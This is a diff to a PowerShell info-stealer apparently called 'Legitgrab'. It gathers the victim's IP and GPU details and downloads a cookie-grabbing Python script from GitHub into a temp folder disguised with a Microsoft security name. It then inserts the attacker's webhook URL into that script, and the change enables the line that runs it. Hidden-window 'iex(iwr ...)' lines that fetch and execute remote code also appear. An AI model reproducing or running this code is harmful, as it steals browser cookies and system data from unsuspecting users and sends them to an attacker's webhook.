@@ -4,7 +4,7 @@ $webHookUrlPYTHON="'"+$webHookUrl+"'"
 $webHookUrlPYTHON2="""$webHookUrl"""
 $webHookUrlPYTHON3="'"+$webHookUrlPYTHON2+"'"
 $webHookUrl2="$"+"webHookUrl"
-$Hook = 'hook = ' + $webHookUrl
+$Hook = 'hook = ' + $webHookUrlPYTHON2
 ##
 $ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
 $gpu = (Get-WmiObject win32_VideoController).Name
@@ -112,7 +112,7 @@ powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
 (Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-#python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
+python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
 #For grab all cookies (no thx lol) and i have a lot of dev
 
 #powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
